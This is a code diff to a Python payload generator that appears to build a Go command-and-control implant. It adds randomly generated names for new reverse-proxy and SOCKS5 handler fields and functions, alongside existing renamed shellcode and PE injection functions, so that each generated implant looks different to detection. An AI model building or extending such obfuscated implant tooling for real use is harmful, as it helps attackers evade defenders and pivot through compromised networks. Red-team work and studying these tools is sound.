@@ -541,6 +541,16 @@ class PayloadGenerator:
         agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
         agent_inject_pe_func = poly.generate_random_name('injectPE')
 
+        # Generate random names for reverse proxy fields
+        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive')
+        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan')
+        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock')
+
+        # Generate random names for reverse proxy function names
+        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy')
+        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy')
+        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5')
+
         # Generate random names for failover functions
         agent_try_failover_func = poly.generate_random_name('tryFailover')
         agent_increment_fail_count_func = poly.generate_random_name('incrementFailCount')
@@ -694,6 +704,16 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
         go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
         go_code = go_code.replace('{AGENT_IN_FAILOVER_ATTEMPT_FIELD}', agent_in_failover_attempt_field)
+
+        # Replace reverse proxy field names
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_ACTIVE_FIELD}', agent_reverse_proxy_active_field)
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}', agent_reverse_proxy_stop_chan_field)
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_LOCK_FIELD}', agent_reverse_proxy_lock_field)
+
+        # Replace reverse proxy function names
+        go_code = go_code.replace('{AGENT_START_REVERSE_PROXY_FUNC}', agent_start_reverse_proxy_func)
+        go_code = go_code.replace('{AGENT_STOP_REVERSE_PROXY_FUNC}', agent_stop_reverse_proxy_func)
+        go_code = go_code.replace('{AGENT_HANDLE_SOCKS5_FUNC}', agent_handle_socks5_func)
 
         # Convert the profile headers dictionary to Go map literal format
         go_headers_parts = []
